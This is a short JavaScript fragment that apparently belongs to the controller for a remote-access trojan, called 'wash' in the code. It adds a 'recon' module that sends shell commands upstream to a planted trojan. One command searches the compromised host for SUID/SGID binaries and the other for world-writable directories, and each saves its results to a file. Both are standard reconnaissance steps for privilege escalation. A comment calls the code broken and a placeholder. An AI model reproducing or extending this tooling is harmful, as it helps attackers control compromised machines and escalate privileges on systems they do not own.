// Here we pop open the wash object once again to patch in some tailored
// functionality.  @note @bug: I think this is actually broken (hangs). This is
// currently just a placeholder for future development
wash.recon = {
    suid: function(){
        // assemble the command to send to the trojan
        wash.command.obj.action = 'shell';
        wash.command.obj.cmd    = 'find / -type f ( -perm -04000 -o -perm -02000 ) > suids.txt';
        wash.command.obj.args   = {} ;

        // send the request upstream
        wash.command.send();
    },

    world_writable_dirs: function(){
        // assemble the command to send to the trojan
        wash.command.obj.action = 'shell';
        wash.command.obj.cmd    = '(find / -perm -2 ! -type l -ls) > world_writeable.txt';
        wash.command.obj.args   = {} ;

        // send the request upstream
        wash.command.send();
    },
};
